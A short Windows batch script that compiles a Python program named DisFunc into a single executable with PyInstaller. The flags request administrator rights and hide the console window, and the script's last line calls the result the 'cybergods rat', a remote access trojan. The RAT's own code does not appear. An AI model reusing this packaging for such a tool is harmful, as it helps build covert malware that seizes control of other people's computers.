@echo off
title Compiling DisFunc
echo Starting to compile DisFunc
pyinstaller source.py --uac-admin --onefile --noconsole --icon="NONE"
echo. 
echo Finished compiling cybergods rat
